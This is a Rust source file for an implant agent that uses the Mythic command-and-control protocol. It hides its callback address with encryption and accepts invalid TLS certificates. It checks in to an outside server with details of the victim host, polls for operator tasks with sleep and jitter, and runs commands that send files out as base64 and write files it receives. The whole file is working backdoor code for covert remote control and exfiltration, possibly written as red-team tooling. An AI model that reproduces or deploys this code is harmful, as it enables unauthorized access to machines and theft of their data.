// link-common — Mythic protocol implementation
//
// Wire format: UUID(36) + base64(nonce_12 || AES-256-GCM(JSON))
// Key: derive_key(IMPLANT_SECRET, "mythic-salt")
// CALLBACK address is stored as hex(nonce_12 || AES-256-GCM(address)) — see encrypt_config/decrypt_config.

use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};

pub mod dispatch;

// ── Wire types Mythic ──────────────────────────────────────────────────────────

#[derive(serde::Serialize)]
pub struct CheckinMessage<'a> {
    pub action: &'a str,
    pub uuid: &'a str,
    pub user: String,
    pub host: String,
    pub pid: u32,
    pub ip: String,
    pub os: &'a str,
    pub arch: &'a str,
    pub domain: &'a str,
    pub integrity_level: u8,
    pub extra_info: &'a str,
    pub sleep_info: &'a str,
}

#[derive(serde::Deserialize, Default)]
pub struct CheckinResponse {
    pub action: String,
    pub id: String,
    pub status: String,
}

#[derive(serde::Serialize)]
pub struct GetTaskingMessage<'a> {
    pub action: &'a str,
    pub tasking_size: i32,
}

#[derive(serde::Deserialize, Default, Clone)]
pub struct Task {
    pub id: String,
    pub command: String,
    pub parameters: String,
}

#[derive(serde::Deserialize, Default)]
pub struct GetTaskingResponse {
    pub action: String,
    pub tasks: Vec<Task>,
}

#[derive(serde::Serialize)]
pub struct TaskResponse {
    pub task_id: String,
    pub completed: bool,
    pub user_output: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<String>,
}

#[derive(serde::Serialize)]
pub struct PostResponseMessage<'a> {
    pub action: &'a str,
    pub responses: Vec<TaskResponse>,
}

// ── HTTP client ────────────────────────────────────────────────────────────────

pub fn build_client() -> reqwest::blocking::Client {
    reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .expect("reqwest client init failed")
}

// ── Encryption ─────────────────────────────────────────────────────────────────

/// Derive a 32-byte AES key: SHA-256(secret || salt).
pub fn derive_key(secret: &[u8], salt: &str) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(secret);
    h.update(salt.as_bytes());
    let result = h.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result[..32]);
    key
}

/// Build a Mythic wire message: UUID(36) + base64(nonce_12 || AES-256-GCM(json)).
pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new_from_slice(key).expect("cipher init");
    let ct = cipher
        .encrypt(nonce, payload_json.as_bytes())
        .expect("encrypt");

    let mut blob = Vec::with_capacity(12 + ct.len());
    blob.extend_from_slice(&nonce_bytes);
    blob.extend_from_slice(&ct);

    format!("{}{}", uuid, STANDARD.encode(&blob))
}

/// Parse a Mythic wire message: strip UUID, base64-decode, AES-GCM-decrypt.
pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    if raw.len() < 36 {
        return None;
    }
    let blob = STANDARD.decode(&raw[36..]).ok()?;
    if blob.len() < 12 {
        return None;
    }

    let nonce = Nonce::from_slice(&blob[..12]);
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher
        .decrypt(nonce, &blob[12..])
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
}

/// Encrypt a config value (CALLBACK address) → hex(nonce_12 || ciphertext).
/// Used at build time by builder.go; the matching decrypt_config() is called at runtime.
#[allow(dead_code)]
pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new_from_slice(key).expect("cipher init");
    let ct = cipher.encrypt(nonce, data.as_bytes()).expect("encrypt");
    let mut result = Vec::with_capacity(12 + ct.len());
    result.extend_from_slice(&nonce_bytes);
    result.extend_from_slice(&ct);
    hex::encode(result)
}

/// Decrypt a hex(nonce_12 || ciphertext) config blob — used for the embedded CALLBACK address.
pub fn decrypt_config(enc_hex: &str, key: &[u8; 32]) -> Option<String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    let data = hex::decode(enc_hex).ok()?;
    if data.len() < 12 {
        return None;
    }
    let nonce = Nonce::from_slice(&data[..12]);
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher
        .decrypt(nonce, &data[12..])
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
}

// ── Shared state (sleep / jitter / kill date) ──────────────────────────────────

static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);
static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);

pub fn get_sleep_seconds() -> u64 {
    SLEEP_SECONDS.load(Ordering::Relaxed)
}
pub fn set_sleep_seconds(s: u64) {
    SLEEP_SECONDS.store(s, Ordering::Relaxed);
}
pub fn get_jitter_percent() -> u32 {
    JITTER_PERCENT.load(Ordering::Relaxed)
}
pub fn set_jitter_percent(p: u32) {
    JITTER_PERCENT.store(p.min(100), Ordering::Relaxed);
}
pub fn get_kill_date() -> Option<i64> {
    let v = KILL_DATE.load(Ordering::Relaxed);
    if v == i64::MIN {
        None
    } else {
        Some(v)
    }
}
pub fn set_kill_date(ts: Option<i64>) {
    KILL_DATE.store(ts.unwrap_or(i64::MIN), Ordering::Relaxed);
}
pub fn should_exit() -> bool {
    if let Some(kd) = get_kill_date() {
        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            return now.as_secs() as i64 > kd;
        }
    }
    false
}

// ── Timing ─────────────────────────────────────────────────────────────────────

pub fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}

pub fn sleep_with_jitter(base: u64, jitter_pct: u32) {
    if jitter_pct == 0 {
        return sleep(base);
    }
    let range = (base as f64 * jitter_pct as f64 / 100.0) as i64;
    let jitter = (rand::random::<u64>() as i64 % (2 * range + 1)) - range;
    let t = if jitter < 0 {
        base.saturating_sub(jitter.unsigned_abs())
    } else {
        base.saturating_add(jitter as u64)
    };
    sleep(t.max(1));
}

// ── Shared helpers ─────────────────────────────────────────────────────────────

pub fn split_first(s: &str) -> (&str, &str) {
    s.find(' ')
        .map(|i| (&s[..i], s[i + 1..].trim_start()))
        .unwrap_or((s, ""))
}

/// Extract a single value from a Mythic parameters JSON object.
/// Falls back to the raw string if the key is absent or if input is not valid JSON.
/// Handles both string and number JSON values.
/// Example: extract_param(r#"{"path": "/tmp"}"#, "path") → "/tmp"
/// Example: extract_param(r#"{"seconds": 30}"#, "seconds") → "30"
pub fn extract_param(parameters: &str, key: &str) -> String {
    serde_json::from_str::<serde_json::Value>(parameters)
        .ok()
        .and_then(|v| {
            let val = v.get(key)?;
            Some(match val {
                serde_json::Value::String(s) => s.clone(),
                serde_json::Value::Number(n) => n.to_string(),
                _ => val.to_string(),
            })
        })
        .unwrap_or_else(|| parameters.to_string())
}

pub fn list_dir(path: &str) -> String {
    match std::fs::read_dir(path) {
        Ok(entries) => entries
            .flatten()
            .map(|e| {
                let name = e.file_name().to_string_lossy().into_owned();
                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                    format!("{}/", name)
                } else {
                    name
                }
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[-] {}", e),
    }
}

pub fn download_file(path: &str) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    if path.is_empty() {
        return "[-] Usage: download <path>".into();
    }
    match std::fs::read(path) {
        Ok(buf) => format!("FILE:{}:{}", path, STANDARD.encode(&buf)),
        Err(e) => format!("[-] {}", e),
    }
}

pub fn upload_file(args: &str) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    let (content, path) = match args.find(' ') {
        Some(i) => (&args[..i], args[i + 1..].trim_start()),
        None => return "[-] Invalid upload format".into(),
    };
    let decoded = match STANDARD.decode(content) {
        Ok(d) => d,
        Err(e) => return format!("[-] base64 decode: {}", e),
    };
    match std::fs::write(path, &decoded) {
        Ok(()) => format!("[+] Uploaded to {}", path),
        Err(e) => format!("[-] {}", e),
    }
}

pub fn handle_sleep_command(args: &str) -> String {
    if args.is_empty() {
        return format!(
            "sleep: {}s, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }
    let parts: Vec<&str> = args.split_whitespace().collect();
    if let Ok(s) = parts[0].parse::<u64>() {
        set_sleep_seconds(s);
        if parts.len() > 1 {
            if let Ok(j) = parts[1].parse::<u32>() {
                set_jitter_percent(j);
            }
        }
        return format!(
            "[+] sleep: {}s, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }
    "[-] Usage: sleep <seconds> [jitter%]".into()
}

pub fn handle_killdate_command(args: &str) -> String {
    if args.is_empty() {
        return match get_kill_date() {
            Some(ts) => format!("killdate: {}", ts),
            None => "no killdate set".into(),
        };
    }
    if args.to_lowercase() == "clear" {
        set_kill_date(None);
        return "[+] killdate cleared".into();
    }
    if let Ok(ts) = args.parse::<i64>() {
        set_kill_date(Some(ts));
        return format!("[+] killdate: {}", ts);
    }
    "[-] Usage: killdate <unix_timestamp|clear>".into()
}

// ── C2 loop ────────────────────────────────────────────────────────────────────

pub struct RegisterInfo {
    pub user: String,
    pub host: String,
    pub ip: String,
    pub os: &'static str,
    pub arch: &'static str,
    pub pid: u32,
    pub integrity_level: u8,
}

pub fn run_c2_loop<F>(
    callback: &str,
    implant_secret: &str,
    payload_uuid: &str,
    reg: RegisterInfo,
    dispatch: F,
) where
    F: Fn(&str, &str) -> String,
{
    let encryption_key = derive_key(implant_secret.as_bytes(), "mythic-salt");
    let decrypted_callback = decrypt_config(callback, &encryption_key)
        .unwrap_or_else(|| callback.to_string());

    let client = build_client();
    let base = format!("https://{}", decrypted_callback);
    let uri = "/";

    // ── Checkin ───────────────────────────────────────────────────────────────
    let checkin = CheckinMessage {
        action: "checkin",
        uuid: payload_uuid,
        user: reg.user.clone(),
        host: reg.host.clone(),
        pid: reg.pid,
        ip: reg.ip,
        os: reg.os,
        arch: reg.arch,
        domain: "",
        integrity_level: reg.integrity_level,
        extra_info: "",
        sleep_info: "",
    };

    let checkin_json = serde_json::to_string(&checkin).unwrap_or_default();
    let checkin_msg = build_mythic_message(payload_uuid, &checkin_json, &encryption_key);

    #[allow(unused_assignments)]
    let mut callback_id = String::new();
    let mut retry_delay: u64 = 5;

    loop {
        if should_exit() {
            return;
        }
        match client
            .post(format!("{}{}", base, uri))
            .body(checkin_msg.clone())
            .header("Content-Type", "application/octet-stream")
            .send()
        {
            Ok(resp) => {
                if let Ok(raw) = resp.text() {
                    if let Some(json) = parse_mythic_message(&raw, &encryption_key) {
                        if let Ok(cr) = serde_json::from_str::<CheckinResponse>(&json) {
                            if cr.status == "success" {
                                callback_id = cr.id;
                                break;
                            }
                        }
                    }
                }
            }
            Err(_) => {}
        }
        sleep(retry_delay);
        retry_delay = (retry_delay * 2).min(60);
    }

    // ── Polling loop ──────────────────────────────────────────────────────────
    loop {
        if should_exit() {
            break;
        }

        let get_tasking = GetTaskingMessage {
            action: "get_tasking",
            tasking_size: -1,
        };
        let get_json = serde_json::to_string(&get_tasking).unwrap_or_default();
        let get_msg = build_mythic_message(&callback_id, &get_json, &encryption_key);

        let tasks: Vec<Task> = match client
            .post(format!("{}{}", base, uri))
            .body(get_msg)
            .header("Content-Type", "application/octet-stream")
            .send()
            .and_then(|r| r.text())
        {
            Ok(raw) => parse_mythic_message(&raw, &encryption_key)
                .and_then(|j| serde_json::from_str::<GetTaskingResponse>(&j).ok())
                .map(|r| r.tasks)
                .unwrap_or_default(),
            Err(_) => {
                sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
                continue;
            }
        };

        if tasks.is_empty() {
            sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
            continue;
        }

        let mut responses = Vec::new();
        for task in &tasks {
            if task.command == "exit" {
                return;
            }
            let output = dispatch(&task.command, &task.parameters);
            responses.push(TaskResponse {
                task_id: task.id.clone(),
                completed: true,
                user_output: output,
                status: None,
            });
        }

        let post_resp = PostResponseMessage {
            action: "post_response",
            responses,
        };
        let post_json = serde_json::to_string(&post_resp).unwrap_or_default();
        let post_msg = build_mythic_message(&callback_id, &post_json, &encryption_key);

        let _ = client
            .post(format!("{}{}", base, uri))
            .body(post_msg)
            .header("Content-Type", "application/octet-stream")
            .send();

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }
}

pub use base64;
pub use serde_json;

// ── Tests ──────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mythic_wire_roundtrip() {
        let key = derive_key(b"test-secret", "mythic-salt");
        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
        let payload = r#"{"action":"get_tasking","tasking_size":-1}"#;

        let wire = build_mythic_message(uuid, payload, &key);
        assert!(wire.starts_with(uuid));
        assert!(wire.len() > 36);

        let recovered = parse_mythic_message(&wire, &key).unwrap();
        assert_eq!(recovered, payload);
    }

    #[test]
    fn test_mythic_wire_wrong_key_returns_none() {
        let key = derive_key(b"correct-key", "mythic-salt");
        let wrong_key = derive_key(b"wrong-key", "mythic-salt");
        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

        let wire = build_mythic_message(uuid, "hello", &key);
        assert!(parse_mythic_message(&wire, &wrong_key).is_none());
    }

    #[test]
    fn test_config_roundtrip() {
        let key = derive_key(b"test-secret", "mythic-salt");
        let addr = "192.168.1.10:443";

        let enc = encrypt_config(addr, &key);
        let dec = decrypt_config(&enc, &key).unwrap();
        assert_eq!(dec, addr);
    }
}
